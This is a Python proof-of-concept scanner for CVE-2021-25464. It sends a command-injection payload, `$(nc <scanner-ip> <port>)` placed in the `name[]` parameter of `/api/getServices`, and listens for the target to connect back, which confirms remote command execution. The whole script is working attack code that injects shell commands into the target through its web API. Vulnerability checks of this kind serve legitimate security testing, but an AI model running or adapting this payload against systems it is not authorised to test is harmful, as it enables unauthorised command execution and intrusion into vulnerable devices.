#encoding:utf-8
try:
    import requests,os,sys,logging,socket,threading
    logging.basicConfig(level=logging.INFO,format="%(message)s")
except Exception as e:
    logging.info("[*] {}".format(e))
    os._exit(6)


def get_my_ip(ip,port):
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((ip,int(port)))
        my_ip = s.getsockname()
        s.close()
        return(my_ip[0])
    except Exception as e:
        logging.info("[-] time out")
        os._exit(4)

def listen(ip,listen_port):
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(5)
        s.bind(("0.0.0.0",listen_port))
        s.listen(1)
        while True:
            sock,addr = s.accept()
            if sock :
                user =  sock.recv(4096).strip()
                logging.info("[+] {} find cve-2021-25464 ".format(ip))
                os._exit(1)
    except Exception as e:
        logging.info("[-] {} do not found cve-2021-25464".format(ip))
        os._exit(2)





def check(ip,port,my_ip,listen_port):
    target = "http://" + ip + ":" + port
    payload = "/api/getServices?name[]=$(nc {} {})".format(my_ip,listen_port)                                                                      #填写payload
    header = {
        "User-agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36',
        "Connection": "close"
    }                                                                                                       #填写header头
    # data = "        "                                                                                       #填写data数据
    try:
        req = requests.get(url=target+payload,headers=header,timeout=10)

    except Exception as e:
        logging.info("[*] {}".format(e))
        os._exit(4)






def main(ip,port):
    listen_port = 10030                                                                               #填写监听端口
    my_ip = get_my_ip(ip,port)
    listening = threading.Thread(target=listen,args=(ip,listen_port,))
    listening.start()

    check(ip,port,my_ip,listen_port)


if __name__== "__main__":
    ip = sys.argv[1]
    port = sys.argv[2]
    main(ip,port)